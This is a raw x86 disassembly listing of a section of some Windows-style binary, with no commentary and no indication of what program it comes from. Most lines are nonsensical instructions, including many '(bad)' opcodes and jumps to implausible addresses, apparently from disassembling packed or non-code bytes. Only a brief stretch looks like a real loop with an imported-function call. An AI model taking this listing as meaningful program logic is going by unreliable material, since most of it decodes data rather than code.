  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x3acc80e2],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad0c
  40ad2c:	dec    edx
  40ad2d:	fadd   DWORD PTR [ebx]
  40ad2f:	pop    esp
  40ad30:	les    ebp,FWORD PTR [eax+0x6d]
  40ad33:	jne    0x5d87dad0
  40ad39:	add    ecx,esp
  40ad3b:	mov    esi,0xfccfb453
  40ad40:	ret    
  40ad41:	mov    al,ds:0x859181b5
  40ad46:	cmp    ch,bl
  40ad48:	(bad)
  40ad4c:	ret    0x7a58
  40ad4f:	adc    BYTE PTR [esi-0x45],dl
  40ad52:	fsub   DWORD PTR [esp+esi*2]
  40ad55:	mov    bl,0xdc
  40ad57:	sahf   
  40ad58:	sbb    DWORD PTR [esi+edx*1+0x480ebb2a],0x95800414
  40ad63:	mov    edx,DWORD PTR [eax+ebx*8]
  40ad66:	scas   eax,DWORD PTR es:[edi]
  40ad67:	mov    ds:0x72074f23,eax
  40ad6c:	pop    edi
  40ad6d:	pop    es
  40ad6e:	adc    BYTE PTR [eax+0x6ca23f0a],ah
  40ad74:	out    dx,al
  40ad75:	lods   al,BYTE PTR ds:[esi]
  40ad76:	ds repnz sbb al,0xa4
  40ad7a:	dec    DWORD PTR [esi+edi*1+0x1873e6ff]
  40ad81:	hlt    
  40ad82:	add    edi,DWORD PTR [edx-0x57c1a0ad]
  40ad88:	dec    esi
  40ad89:	stos   DWORD PTR es:[edi],eax
  40ad8a:	sbb    DWORD PTR [eax-0x7988aa4b],ecx
  40ad90:	mov    bh,0x8e
  40ad92:	mov    eax,ds:0x57e7a228
  40ad97:	into   
  40ad98:	aas    
  40ad99:	push   eax
  40ad9a:	pop    edi
  40ad9b:	dec    edi
  40ad9c:	into   
  40ad9d:	scas   eax,DWORD PTR es:[edi]
  40ad9e:	sar    DWORD PTR [eax+0x2c040599],1
  40ada4:	push   es
  40ada5:	fadd   QWORD PTR [edi+0x35c943f3]
  40adab:	add    dl,cl
  40adad:	repnz cmp ebx,DWORD PTR [eax+0x1770c9fa]
  40adb4:	test   BYTE PTR [ecx+0x28b65eae],cl
  40adba:	popf   
  40adbb:	mov    edx,0x39e86330
  40adc0:	and    al,0x4b
  40adc2:	add    eax,0x4705e259
  40adc7:	(bad)  
  40adc9:	xchg   edi,eax
  40adca:	lahf   
  40adcb:	dec    edx
  40adcc:	xchg   ebx,eax
  40adcd:	dec    ecx
  40adce:	push   esp
  40adcf:	adc    DWORD PTR [ebx-0x1a],edi
  40add2:	out    0xb9,eax
  40add4:	scas   al,BYTE PTR es:[edi]
  40add5:	jmp    0x69516970
  40adda:	push   0xa5c725ab
  40addf:	jns    0x40ae12
  40ade1:	je     0x40ad74
  40ade3:	or     ah,BYTE PTR [ecx+esi*4-0x38]
  40ade7:	push   ecx
  40ade8:	mov    esp,0xfc6d7d2b
  40aded:	jl     0x40ad7e
  40adef:	push   ecx
  40adf0:	xlat   BYTE PTR ds:[ebx]
  40adf1:	and    ebx,esp
  40adf3:	pop    ebx
  40adf4:	pop    ss
  40adf5:	dec    ebx
  40adf6:	mov    dh,0xe
  40adf8:	dec    ecx
  40adf9:	jg     0x40ade8
  40adfb:	jbe    0x40ade7
  40adfd:	sub    al,0xd2
  40adff:	pop    esi
  40ae00:	ja     0x40ae6e
  40ae02:	cli    
  40ae03:	jae    0x40ae0b
  40ae05:	inc    eax
  40ae06:	jbe    0x40add6
  40ae08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae09:	std    
  40ae0a:	sub    al,0x78
  40ae0c:	outs   dx,BYTE PTR ds:[esi]
  40ae0d:	gs dec esp
  40ae0f:	mov    cl,0x42
  40ae11:	fs adc bh,dl
  40ae14:	call   0x60266440
  40ae19:	sar    DWORD PTR [edi],cl
  40ae1b:	jle    0x40adf4
  40ae1d:	xchg   ebp,eax
  40ae1e:	(bad)  
  40ae20:	test   DWORD PTR [ebx-0x597e7a29],ecx
  40ae26:	mov    DWORD PTR [ebp+ebx*4+0x414b0234],ebp
  40ae2d:	(bad)  
  40ae2e:	pop    ss
  40ae2f:	xor    eax,0x246a604b
  40ae34:	cld    
  40ae35:	push   edx
  40ae36:	adc    BYTE PTR [ebp+0x53a0ac59],bl
  40ae3c:	das    
  40ae3d:	int    0xb7
  40ae3f:	xlat   BYTE PTR ds:[ebx]
  40ae40:	sbb    ah,BYTE PTR [ecx+ebx*1-0x67]
  40ae44:	push   esp
  40ae45:	outs   dx,DWORD PTR ds:[esi]
  40ae46:	ret    0x6dae
  40ae49:	arpl   WORD PTR [eax],bx
  40ae4b:	ret    
  40ae4c:	fs loope 0x40ae06
  40ae4f:	inc    esp
  40ae50:	adc    DWORD PTR [edx+0x713897cc],edi
  40ae56:	mov    al,0x3c
  40ae58:	outs   dx,DWORD PTR ds:[esi]
  40ae59:	shl    eax,cl
  40ae5b:	pushf  
  40ae5c:	fs push 0xffffffc7
  40ae5f:	popf   
  40ae60:	mov    ch,0x19
  40ae62:	add    BYTE PTR [ecx+0x501c8490],ah
  40ae68:	clc    
  40ae69:	(bad)  
  40ae6a:	sub    BYTE PTR [ecx],bl
  40ae6c:	pop    edi
  40ae6d:	imul   esp,eax,0x50
  40ae70:	pop    ebp
  40ae71:	dec    ecx
  40ae72:	mov    ebp,0x5aedff8c
  40ae77:	mov    edx,0xfc431fb7
  40ae7c:	and    al,0xf6
  40ae7e:	xchg   esp,eax
  40ae7f:	jge    0x40ae7c
  40ae81:	popf   
  40ae82:	or     dl,BYTE PTR [eax]
  40ae84:	cwde   
  40ae85:	(bad)  
  40ae86:	fs mov cl,0xb
  40ae89:	adc    ah,BYTE PTR [edx]
  40ae8b:	mov    al,0xae
  40ae8d:	lea    edi,[esi-0x42]
  40ae90:	repnz xor al,0xc5
  40ae93:	jmp    0x56076860
  40ae98:	sar    dl,1
  40ae9a:	enter  0xef97,0x60
  40ae9e:	fistp  WORD PTR [edi-0x5c1056d3]
  40aea4:	(bad)  
  40aea5:	lods   eax,DWORD PTR ds:[esi]
  40aea6:	push   esp
  40aea8:	fcomp  DWORD PTR [edx]
  40aeaa:	or     edx,ebx
  40aeac:	(bad)  
  40aead:	dec    ebx
  40aeae:	xchg   edx,eax
  40aeaf:	adc    ecx,ebp
  40aeb1:	or     eax,0x40ee40c
  40aeb6:	or     esi,DWORD PTR [ebp+edx*4-0x72752c6f]
  40aebd:	pop    edx
  40aebe:	or     BYTE PTR [edi+0x4dc86513],ch
  40aec4:	push   ebp
  40aec5:	test   dh,cl
  40aec7:	js     0x40ae95
  40aec9:	sbb    al,0x8c
  40aecb:	ins    BYTE PTR es:[edi],dx
  40aecc:	jmp    FWORD PTR [edi+0xfb89838]
  40aed2:	jnp    0x40ae68
  40aed4:	dec    edx
  40aed5:	mov    dh,0xcf
  40aed7:	dec    BYTE PTR [edi+ecx*4+0x3f]
  40aedb:	pop    edi
  40aedc:	(bad)  
  40aedd:	lods   eax,DWORD PTR ds:[esi]
  40aede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aedf:	call   0x58c2:0x52c0bed5
  40aee6:	popa   
  40aee7:	sar    DWORD PTR [eax],1
  40aee9:	mov    edi,0xb4795e0b
  40aeee:	ds push ds
  40aef0:	inc    edi
  40aef1:	fist   WORD PTR [edi]
  40aef3:	xor    DWORD PTR [edi],0xa076d74c
  40aef9:	jecxz  0x40aed4
  40aefb:	repz mov ebp,0xf7cfa393
  40af01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af02:	add    DWORD PTR [edi-0x475afc32],edi
  40af08:	adc    eax,0xd237e0c4
  40af0d:	sbb    DWORD PTR [ecx*8+0x7e7a2153],ebx
  40af14:	(bad)  
  40af15:	test   al,0x15
  40af17:	add    DWORD PTR [edx],ecx
  40af19:	inc    edx
  40af1a:	xlat   BYTE PTR ds:[ebx]
  40af1b:	popa   
  40af1c:	(bad)  
  40af1d:	lods   al,BYTE PTR ds:[esi]
  40af1e:	(bad)  
  40af20:	sbb    ebx,DWORD PTR [ecx]
  40af22:	push   ss
  40af23:	xlat   BYTE PTR ds:[ebx]
  40af24:	jno    0x40af42
  40af26:	cmp    BYTE PTR ds:0xc90f8f73,ch
  40af2c:	or     al,0xd2
  40af2e:	mov    eax,ds:0x163d1f60
  40af33:	(bad)  
  40af34:	lea    eax,[edi+0x1f]
  40af37:	cmp    ebp,DWORD PTR [esi+0x46f1f721]
  40af3d:	pushf  
  40af3e:	stos   DWORD PTR es:[edi],eax
  40af3f:	cmp    bl,bl
  40af41:	test   BYTE PTR [esi],dh
  40af43:	out    dx,eax
  40af44:	(bad)  
  40af45:	repz (bad) 
  40af48:	daa    
  40af49:	push   0xffffffed
  40af4b:	push   0xd330143b
  40af50:	sub    bl,cl
  40af52:	cdq    
  40af53:	mov    ds:0xe04724a0,al
  40af58:	fmul   QWORD PTR [esi]
  40af5a:	fs or  bh,dh
  40af5d:	enter  0xcd0f,0x94
  40af61:	push   es
  40af62:	or     ah,bh
  40af64:	jl     0x40aefe
  40af66:	call   FWORD PTR ds:0xc8a898c
  40af6c:	cmc    
  40af6d:	and    eax,0x8b197fa0
  40af72:	inc    eax
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x433727
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x4336df
  40af93:	sub    DWORD PTR ds:0x43368f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x4336db,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x4336db
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x4336db,ecx
  40afb8:	cmp    DWORD PTR ds:0x4336db,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x4336db,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x4336db,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x4336db
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x4336db,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x433727,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	das    
  40b018:	push   ebp
  40b019:	and    DWORD PTR [edx+0x7e7ef764],edi
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	and    BYTE PTR [ecx+0x69ae4ca7],dl
  40b029:	sub    bl,BYTE PTR [edi+0x35]
  40b02c:	jbe    0x40b027
  40b02e:	into   
  40b02f:	push   esi
  40b030:	mov    BYTE PTR [edi-0x796afadb],ah
  40b036:	pop    eax
  40b037:	adc    eax,esi
  40b039:	out    dx,al
  40b03a:	stos   BYTE PTR es:[edi],al
  40b03b:	mov    ds:0x39427ab2,eax
  40b040:	pop    ecx
  40b041:	lea    ebx,[esi+0x71947122]
  40b047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b048:	(bad)  
  40b049:	jmp    0x7e50af5e
  40b04e:	popf   
  40b04f:	cs jae 0x40b0ba
  40b052:	pop    ds
  40b053:	dec    ebp
  40b054:	ds lahf 
  40b056:	xchg   edi,eax
  40b057:	int3   
  40b058:	jge    0x40b096
  40b05a:	jne    0x40b09b
  40b05c:	or     eax,0x21f9a24b
  40b061:	or     cl,ah
  40b063:	push   esp
  40b064:	mov    dl,0x60
  40b066:	xor    al,0x15
  40b068:	adc    eax,0x36dc67
  40b06d:	bound  esi,QWORD PTR [esi-0x2a]
  40b070:	mov    WORD PTR [edx-0x1f],fs
  40b073:	pop    es
  40b074:	in     eax,0xbc
  40b076:	cmp    BYTE PTR [ebx+0x64],cl
  40b079:	mov    DWORD PTR [ecx],0xa5eea123
  40b07f:	hlt    
  40b080:	push   edi
  40b081:	add    ecx,ebp
  40b083:	jmp    0x40b07f
  40b085:	cdq    
  40b086:	mov    ah,0x70
  40b088:	in     eax,dx
  40b089:	mov    esi,0xe66ef0e6
  40b08e:	add    al,0xbb
  40b090:	push   ecx
  40b091:	(bad)  
  40b092:	cld    
  40b093:	ds imul ecx,edi,0x2df0cfd6
  40b09a:	ret    
  40b09b:	test   cl,0xdc
  40b09e:	test   BYTE PTR [edx-0x31e2357b],0xaa
  40b0a5:	(bad)  
  40b0a6:	les    edi,FWORD PTR [ecx+0x27]
  40b0a9:	ins    BYTE PTR es:[edi],dx
  40b0aa:	iret   
  40b0ab:	outs   dx,BYTE PTR ds:[esi]
  40b0ac:	jmp    FWORD PTR [eax-0x1b474445]
  40b0b2:	xor    BYTE PTR [eax+0x71],0xfd
  40b0b6:	mov    edx,0x779c5766
  40b0bb:	shl    eax,1
  40b0bd:	pop    es
  40b0be:	pop    ebp
  40b0bf:	xor    BYTE PTR [eax-0x57],dl
  40b0c2:	adc    BYTE PTR [ebp+esi*4-0x2],dl
  40b0c6:	pop    edx
  40b0c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0c8:	pop    edx
  40b0c9:	and    ecx,DWORD PTR [eax+0x2e]
  40b0cc:	or     al,0x16
  40b0ce:	or     al,0x62
  40b0d0:	cmp    al,0x26
  40b0d2:	std    
  40b0d3:	outs   dx,BYTE PTR ds:[esi]
  40b0d4:	ins    BYTE PTR es:[edi],dx
  40b0d5:	pop    edx
  40b0d6:	shl    BYTE PTR [ebp+0x5f14fa5c],cl
  40b0dc:	xor    al,0x7b
  40b0de:	jne    0x40b0bb
  40b0e0:	sub    al,BYTE PTR [edi]
  40b0e2:	jo     0x40b0ff
  40b0e4:	(bad)  
  40b0e5:	cmp    DWORD PTR [edx-0x61],edi
  40b0e8:	jmp    0x40b09f
  40b0ea:	stc    
  40b0eb:	rcr    DWORD PTR [ebx+0x40e402fc],cl
  40b0f1:	sbb    al,0x7
  40b0f3:	adc    dl,ah
  40b0f5:	push   ss
  40b0f6:	pop    ecx
  40b0f7:	iret   
  40b0f8:	jb     0x40b0a8
  40b0fa:	gs lahf 
  40b0fc:	iret   
  40b0fd:	not    al
  40b0ff:	mov    ecx,DWORD PTR [edi+0x197844c1]
  40b105:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b106:	cld    
  40b107:	add    dh,BYTE PTR [ebx-0x7f4541ac]
  40b10d:	pop    edx
  40b10e:	idiv   BYTE PTR [esi+0x6966dca2]
  40b114:	mov    DWORD PTR [ebx+0x9f518a5],ecx
  40b11a:	jb     0x40b0b8
  40b11c:	scas   al,BYTE PTR es:[edi]
  40b11d:	bound  edi,QWORD PTR [edx]
  40b11f:	xchg   ecx,eax
  40b120:	xor    eax,0x9f48c6b3
  40b125:	fs inc sp
  40b128:	add    ebx,ebx
  40b12a:	ret    0x7e54
  40b12d:	retf   0x7bf1
  40b130:	sahf   
  40b131:	mul    DWORD PTR [edx]
  40b133:	mov    ebx,0xf068f1b1
  40b138:	adc    al,0xc4
  40b13a:	and    al,0xc6
  40b13c:	mov    cl,BYTE PTR [edi-0x47c06d0e]
  40b142:	xor    bl,al
  40b144:	nop
  40b145:	rcl    BYTE PTR [ecx+0x15e10773],cl
  40b14b:	int    0xc1
  40b14d:	ds xor ah,dh
  40b150:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b151:	mov    eax,0x5441374f
  40b156:	dec    edx
  40b157:	mov    ah,0x51
  40b159:	xchg   esi,eax
  40b15a:	lahf   
  40b15b:	mov    ebp,0x2c82e896
  40b160:	into   
  40b161:	inc    ebx
  40b162:	lds    esp,FWORD PTR [ebx+0xd623f39]
  40b168:	dec    ebx
  40b169:	call   0x51bb1891
  40b16e:	jmp    0xc28e:0x5f076db2
  40b175:	in     al,dx
  40b176:	jns    0x40b140
  40b178:	and    al,0x3
  40b17a:	and    BYTE PTR [eax+0x5e],bl
  40b17d:	pushf  
  40b17e:	xor    ch,BYTE PTR [eax+edx*8-0x1b]
  40b182:	fwait
  40b183:	aas    
  40b184:	int    0xad
  40b186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b187:	(bad)  
  40b188:	cmp    cl,dh
  40b18a:	fadd   QWORD PTR [esp+esi*2+0x6]
  40b18e:	mov    dl,0x67
  40b190:	int3   
  40b191:	xor    BYTE PTR [ebx],0x84
  40b194:	nop
  40b195:	adc    BYTE PTR [esi+0x4bd2a489],dh
  40b19b:	ret    
  40b19c:	sbb    esp,edi
  40b19e:	les    ebx,FWORD PTR [edx-0x38]
  40b1a1:	or     al,0xf6
  40b1a3:	or     eax,0xaa6b6ff
  40b1a8:	scas   al,BYTE PTR es:[edi]
  40b1a9:	adc    BYTE PTR [ecx+edi*4+0xc],ah
  40b1ad:	fnstenv [edi-0x50fa193f]
  40b1b3:	cmc    
  40b1b4:	popf   
  40b1b5:	add    al,BYTE PTR [ecx-0x6c721e75]
  40b1bb:	bound  esi,QWORD PTR [edi]
  40b1bd:	ror    DWORD PTR [edx+esi*1],0x8f
  40b1c1:	jb     0x40b233
  40b1c3:	push   esi
  40b1c4:	push   ecx
  40b1c5:	mov    ecx,edx
  40b1c7:	data16 mov bl,0xf0
  40b1ca:	ret    
  40b1cb:	cmp    al,BYTE PTR [ebx]
  40b1cd:	mov    eax,ds:0x931be244
  40b1d2:	jmp    0x40b159
  40b1d4:	fild   DWORD PTR [eax+eiz*1-0x2cf50514]
  40b1db:	scas   al,BYTE PTR es:[edi]
  40b1dc:	mov    eax,ebx
  40b1de:	mov    BYTE PTR [ecx-0x54],cl
  40b1e1:	fcomi  st,st(1)
  40b1e3:	xor    eax,DWORD PTR [edi-0x2d6cf173]
  40b1e9:	adc    eax,0x56f948e6
  40b1ee:	push   cs
  40b1ef:	sub    bl,BYTE PTR [ebx]
  40b1f1:	(bad)  
  40b1f2:	popf   
  40b1f3:	jp     0x40b186
  40b1f5:	adc    al,0xa7
  40b1f7:	clc    
  40b1f8:	cmp    eax,0xafaa74f3
  40b1fd:	sar    BYTE PTR [ebx],cl
  40b1ff:	stos   BYTE PTR es:[edi],al
  40b200:	inc    eax
  40b201:	std    
  40b202:	mov    ds:0x6ab588bc,al
  40b207:	cmp    al,0x15
  40b209:	add    al,0x6f
  40b20b:	call   0xf3719e47
  40b210:	mov    eax,0x8e9b455f
  40b215:	imul   esi,esi,0x7ab2064
  40b21b:	pinsrw mm0,WORD PTR [esi],0xb0
  40b21f:	cmc    
  40b220:	and    BYTE PTR [ecx-0x73],0x2a
  40b224:	ror    DWORD PTR [ecx],0xcf
  40b227:	sti    
  40b228:	add    BYTE PTR [edi],dl
  40b22a:	mov    bh,0x95
  40b22c:	xor    DWORD PTR [esi+eax*1+0x75984ea6],ebp
  40b233:	or     eax,0xe7bb205f
  40b238:	aaa    
  40b239:	gs fwait
  40b23b:	dec    ebp
  40b23c:	fdivr  DWORD PTR [edi]
  40b23e:	adc    BYTE PTR ds:0x2f15dcea,ch
  40b244:	mov    al,0x88
  40b247:	mov    eax,ds:0xc5458048
  40b24c:	jmp    0x42fd:0xc5fabaae
  40b253:	mov    ds:0xdca917a3,al
  40b258:	imul   DWORD PTR [ecx-0x10479e17]
  40b25e:	call   0xd4e7:0xaf36e71f
  40b265:	sub    ch,BYTE PTR [edi-0x17]
  40b268:	imul   ecx,DWORD PTR [ebx+0x4d8bec45],0x24480308
  40b272:	jmp    0x40b4d5
  40b277:	jno    0x40b206
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	fs ja  0x40b266
  40b286:	mov    ebp,DWORD PTR [esi]
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	push   cs
  40b290:	xor    esi,DWORD PTR cs:[edx-0x2]
  40b294:	sub    DWORD PTR [ebp+0x408d631e],ebp
  40b29a:	mov    al,0x82
  40b29c:	jl     0x40b262
  40b29e:	cld    
  40b29f:	and    DWORD PTR [esi+ebp*4-0x4],edi
  40b2a3:	or     eax,0x1ff1f11a
  40b2a8:	ss out 0xc1,eax
  40b2ab:	in     eax,0xe7
  40b2ad:	(bad)  
  40b2ae:	dec    ebx
  40b2af:	fld    TBYTE PTR [esi+0x27]
  40b2b2:	(bad)  [ebx]
  40b2b4:	into   
  40b2b5:	mov    ch,0x6
  40b2b7:	cmp    al,0x56
  40b2b9:	sbb    DWORD PTR [edx],ebp
  40b2bb:	mov    cl,0x65
  40b2bd:	aad    0x2d
  40b2bf:	sub    DWORD PTR [eax-0x5f],edx
  40b2c2:	les    ebp,FWORD PTR [ecx-0x63b781e5]
  40b2c8:	dec    ecx
  40b2c9:	scas   al,BYTE PTR es:[edi]
  40b2ca:	mov    dh,0x2a
  40b2cc:	dec    ecx
  40b2cd:	nop
  40b2ce:	cli    
  40b2cf:	or     DWORD PTR [ecx+eax*2+0x7],edx
  40b2d3:	push   ecx
  40b2d4:	or     eax,0x21cfbce7
  40b2d9:	inc    esp
  40b2da:	outs   dx,DWORD PTR ds:[esi]
  40b2db:	out    0x2e,eax
  40b2dd:	xor    al,0x66
  40b2df:	push   ss
  40b2e0:	out    dx,al
  40b2e1:	rcl    DWORD PTR [esi+0x6868b58c],cl
  40b2e7:	mov    bh,0x9b
  40b2e9:	div    BYTE PTR [ebx-0x4c37d5f6]
  40b2ef:	push   DWORD PTR [esp+ebp*1+0x36e0273c]
  40b2f6:	ficom  WORD PTR ds:0xf59b48f8
  40b2fc:	(bad)  
  40b2fd:	push   ebx
  40b2fe:	pop    ecx
  40b2ff:	idiv   BYTE PTR [edi]
  40b301:	inc    eax
  40b302:	sar    DWORD PTR [ecx-0x47164b8c],0x22
  40b309:	mov    bl,0x12
  40b30b:	jmp    0x2c2:0xb3573409
  40b312:	(bad)  
  40b313:	clc    
  40b314:	dec    esp
  40b315:	cmc    
  40b316:	test   DWORD PTR [ecx+0x70b0375c],0xb7ebd2c9
  40b320:	jmp    0x52329c77
  40b325:	cmp    al,0xd1
  40b327:	in     eax,dx
  40b328:	sub    edx,DWORD PTR [esi-0x2a93a505]
  40b32e:	inc    esp
  40b32f:	mov    ebp,0xef8d5412
  40b334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b335:	mov    bl,0xaa
  40b337:	cld    
  40b338:	int    0xe6
  40b33a:	dec    edx
  40b33b:	sub    ebp,edx
  40b33d:	inc    edx
  40b33e:	add    edi,ecx
  40b340:	sub    BYTE PTR [edi-0x60d8819b],ah
  40b346:	inc    ebx
  40b347:	mov    edi,0x5c09cc66
  40b34c:	shl    ah,cl
  40b34e:	cmp    ch,BYTE PTR [edi-0x70c0b9bf]
  40b354:	cld    
  40b355:	in     al,dx
  40b356:	int    0x6f
  40b358:	mov    cl,bl
  40b35a:	nop
  40b35b:	or     bl,cl
  40b35d:	pushf  
  40b35e:	sbb    BYTE PTR [ebx+0x790c2932],ch
  40b364:	xor    BYTE PTR [esp+eax*1-0x7778079c],0x2b
  40b36c:	and    BYTE PTR [esi],0x8
  40b36f:	sbb    eax,0x490e6f63
  40b374:	cld    
  40b375:	ret    0xc7c7
  40b378:	push   0xffffff8b
  40b37a:	jmp    0xe1054c8e
  40b37f:	into   
  40b380:	out    0x87,al
  40b382:	(bad)  
  40b383:	rcr    DWORD PTR [edx],1
  40b385:	lods   eax,DWORD PTR ds:[esi]
  40b386:	fs inc ecx
  40b388:	pusha  
  40b389:	(bad)  [edx-0x520e7c46]
  40b38f:	cmp    DWORD PTR [edi],esi
  40b391:	outs   dx,DWORD PTR ds:[esi]
  40b392:	add    dl,BYTE PTR [ebp+0x4c]
  40b395:	xchg   esp,eax
  40b396:	cmp    DWORD PTR [esi+0x763da30d],esi
  40b39c:	push   cs
  40b39d:	xor    DWORD PTR [edx],edx
  40b39f:	mov    edx,0x5770fac7
  40b3a4:	sub    al,0x3
  40b3a6:	mov    ecx,0x8a532728
  40b3ab:	out    0x27,al
  40b3ad:	cs xchg esi,eax
  40b3af:	dec    esp
  40b3b0:	and    DWORD PTR [edx-0x513d931a],esi
  40b3b6:	jg     0x40b389
  40b3b8:	test   BYTE PTR [esi],bh
  40b3ba:	cmp    al,0xdd
  40b3bc:	cmp    dl,BYTE PTR [ebx+0x56]
  40b3bf:	push   ss
  40b3c0:	sti    
  40b3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3c2:	(bad)  
  40b3c3:	out    dx,eax
  40b3c4:	in     al,dx
  40b3c5:	sub    ebp,esp
  40b3c7:	mov    eax,ds:0x8c761d35
  40b3cc:	and    dh,BYTE PTR [ecx-0x54]
  40b3cf:	lock retf 0xaaab
  40b3d3:	fild   DWORD PTR [ecx]
  40b3d5:	dec    ecx
  40b3d6:	outs   dx,BYTE PTR ds:[esi]
  40b3d7:	rcl    BYTE PTR [edi+0x7aabb1cc],1
  40b3dd:	cmp    bl,bh
  40b3df:	inc    BYTE PTR [ebx]
  40b3e1:	push   edx
  40b3e2:	jl     0x40b427
  40b3e4:	push   eax
  40b3e5:	fs scas eax,DWORD PTR es:[edi]
  40b3e7:	fimul  DWORD PTR [edx+0x17]
  40b3ea:	jg     0x40b377
  40b3ec:	xor    ebp,DWORD PTR [edi+ebp*8-0xa]
  40b3f0:	pop    edi
  40b3f1:	push   edx
  40b3f2:	(bad)  [eax]
  40b3f4:	mov    ebx,0x35d0ef89
  40b3f9:	scas   eax,DWORD PTR es:[edi]
  40b3fa:	mov    ebx,DWORD PTR [ebp+0x66]
  40b3fd:	mov    al,BYTE PTR [eax]
  40b3ff:	dec    ebx
  40b400:	mov    edx,0x3e228ba5
  40b405:	cwde   
  40b406:	jns    0x40b3ef
  40b408:	cmp    al,0xa9
  40b40a:	clc    
  40b40b:	out    dx,eax
  40b40c:	add    esi,DWORD PTR [ebx+ecx*1]
  40b40f:	mov    esp,0xe9818040
  40b414:	push   eax
  40b415:	dec    eax
  40b416:	mov    dl,0xea
  40b418:	and    eax,DWORD PTR [ebx]
  40b41a:	mov    edi,0x651feb13
  40b41f:	pusha  
  40b420:	pop    edx
  40b421:	mov    ah,0x5
  40b423:	dec    esi
  40b424:	aaa    
  40b425:	xchg   ebx,eax
  40b426:	iret   
  40b427:	pusha  
  40b428:	push   esp
  40b429:	not    BYTE PTR [edi-0x6a]
  40b42c:	xor    al,0x8b
  40b42e:	dec    esp
  40b42f:	cmp    eax,0x4d01426c
  40b434:	add    dl,BYTE PTR [edi+0x145550b3]
  40b43a:	(bad)  
  40b43b:	cmp    al,0x2c
  40b43d:	loop   0x40b4bb
  40b43f:	cs ja  0x40b44e
  40b442:	ror    DWORD PTR [edx],0xe0
  40b445:	pop    esi
  40b446:	repz retf 0x7368
  40b44a:	pause  
  40b44c:	and    eax,DWORD PTR [edx+0x3d409a03]
  40b452:	and    ch,BYTE PTR [ecx]
  40b454:	and    edx,DWORD PTR [edi+0x5e6b2273]
  40b45a:	push   esp
  40b45b:	mov    ecx,0xf43a4a14
  40b460:	fs cmc 
  40b462:	ret    0x6574
  40b465:	xchg   edi,eax
  40b466:	push   ss
  40b467:	pop    es
  40b468:	pusha  
  40b469:	stos   DWORD PTR es:[edi],eax
  40b46a:	inc    ecx
  40b46b:	aas    
  40b46c:	imul   edi,DWORD PTR [esi+0x519418a8],0x2
  40b473:	out    0x2b,eax
  40b475:	add    DWORD PTR [eax],ecx
  40b477:	pop    edi
  40b478:	add    BYTE PTR [ebx],cl
  40b47a:	ja     0x40b4a0
  40b47c:	push   ebp
  40b47d:	lock add edx,DWORD PTR ds:0x615219cd
  40b484:	aad    0x61
  40b486:	cs retf 
  40b488:	in     eax,dx
  40b489:	xchg   edx,eax
  40b48a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b48b:	dec    edi
  40b48c:	push   cs
  40b48d:	push   0xe64f150b
  40b492:	shr    DWORD PTR ds:0x7ac8f462,1
  40b498:	push   eax
  40b499:	lea    eax,[edx]
  40b49b:	mov    DWORD PTR [edi+0x1d],ebx
  40b49e:	test   al,0xd8
  40b4a0:	push   edx
  40b4a1:	retf   
  40b4a2:	ja     0x40b4d3
  40b4a4:	fst    QWORD PTR [eax]
  40b4a6:	adc    DWORD PTR [ebx],edi
  40b4a8:	add    eax,0xb74f6893
  40b4ad:	or     eax,0xc87d331b
  40b4b2:	iret   
  40b4b3:	scas   al,BYTE PTR es:[edi]
  40b4b4:	lds    ebp,FWORD PTR [ecx+0x52]
  40b4b7:	add    al,0xc5
  40b4b9:	(bad)  
  40b4bb:	test   edi,edx
  40b4bd:	xacquire xchg BYTE PTR [edx-0x70f8c14e],dl
  40b4c4:	mov    eax,ds:0xbb918469
  40b4c9:	cmc    
  40b4ca:	fdivr  QWORD PTR [edi-0x1e6ab1cd]
  40b4d0:	mov    BYTE PTR [ebp+ebx*4+0x33],cl
  40b4d4:	mov    esp,0x8bd44d89
  40b4d9:	inc    ebp
  40b4da:	in     al,dx
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
